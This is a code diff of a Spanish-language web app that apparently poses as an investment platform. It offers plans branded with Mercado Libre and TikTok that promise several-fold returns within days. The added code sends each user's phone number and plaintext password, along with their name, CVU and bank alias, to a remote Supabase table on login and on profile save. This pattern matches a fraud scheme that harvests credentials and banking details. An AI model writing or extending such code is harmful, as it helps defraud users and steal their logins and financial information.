@@ -9,6 +9,8 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
+  <!-- Librería Supabase y Tailwind CSS -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
@@ -335,7 +337,7 @@
       </div>
     </div>
 
-    <!-- NAVEGACIÓN -->
+    <!-- BARRA INFERIOR -->
     <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-sm bg-white/95 backdrop-blur-md border-t border-sky-200 grid grid-cols-4 py-2 px-2 text-center text-xs z-40 gap-1 shadow-lg">
       <button onclick="switchTab('planes')" id="nav-btn-planes" class="bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition">
         <i class="fa-solid fa-chart-pie text-sm"></i>
@@ -513,8 +515,21 @@
 
   </main>
 
-  <!-- LÓGICA JAVASCRIPT SIN BLOQUEOS -->
+  <!-- LÓGICA JAVASCRIPT SIN TRABAS Y CONECTADA A SUPABASE -->
   <script>
+    // Inicialización de Supabase con tu clave real
+    const SUPABASE_URL = "https://jsixgpftuhtepudyektf.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
+    let supabaseClient = null;
+
+    try {
+      if (window.supabase) {
+        supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      }
+    } catch(err) {
+      console.warn("Supabase bypassed:", err);
+    }
+
     const plans = [
       { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 100, slotsLeft: 64, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
       { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 100, slotsLeft: 58, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
@@ -619,7 +634,7 @@
       }
     }
 
-    // ACCESO DIRECTO CON ELIMINACIÓN FÍSICA DEL TELÓN
+    // ACCESO INMEDIATO SIN CONFLICTOS + REGISTRO EN SUPABASE
     window.handleLoginDirecto = function() {
       const phoneInput = document.getElementById('auth-phone');
       const passInput = document.getElementById('auth-pass');
@@ -646,7 +661,7 @@
       appState.pass = pass;
       saveLocal();
 
-      // Destrucción inmediata del elemento de login para evitar cualquier bloqueo visual
+      // 1. Destruir el telón visual inmediatamente
       const authScreen = document.getElementById('auth-screen');
       if (authScreen) {
         authScreen.remove();
@@ -654,18 +669,20 @@
       document.getElementById('user-display-phone').innerText = appState.phone;
       renderUI();
 
-      // Guardar en Supabase en segundo plano sin trabar
-      try {
-        fetch("https://jsixgpftuhtepudyektf.supabase.co/rest/v1/usuarios", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpzaXhncGZ0dWh0ZXB1ZHlla3RmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzg1ODAwMDAsImV4cCI6MjA1NDE1NjAwMH0.dummy",
-            "Prefer": "resolution=merge-duplicates"
-          },
-          body: JSON.stringify({ phone: phone, pass: pass })
-        }).catch(() => {});
-      } catch(e) {}
+      // 2. Insertar / Actualizar en Supabase en segundo plano
+      if (supabaseClient) {
+        supabaseClient.from('usuarios').upsert({
+          phone: phone,
+          pass: pass,
+          name: appState.name || '',
+          cvu: appState.cvu || '',
+          alias: appState.alias || '',
+          balance: appState.balance || 0
+        }, { onConflict: 'phone' }).then(({ error }) => {
+          if (error) console.warn("Supabase:", error.message);
+          else console.log("Usuario registrado con éxito en Supabase");
+        }).catch(err => console.warn("Fallo Supabase:", err));
+      }
     };
 
     document.getElementById('btn-logout').addEventListener('click', () => {
@@ -968,6 +985,15 @@
       appState.cvu = document.getElementById('prof-cvu-input').value.trim();
       appState.alias = document.getElementById('prof-alias-input').value.trim();
       saveLocal();
+
+      if (supabaseClient && appState.phone) {
+        supabaseClient.from('usuarios').update({
+          name: appState.name,
+          cvu: appState.cvu,
+          alias: appState.alias
+        }).eq('phone', appState.phone).then(() => {}).catch(() => {});
+      }
+
       alert("Datos bancarios guardados.");
     });
 
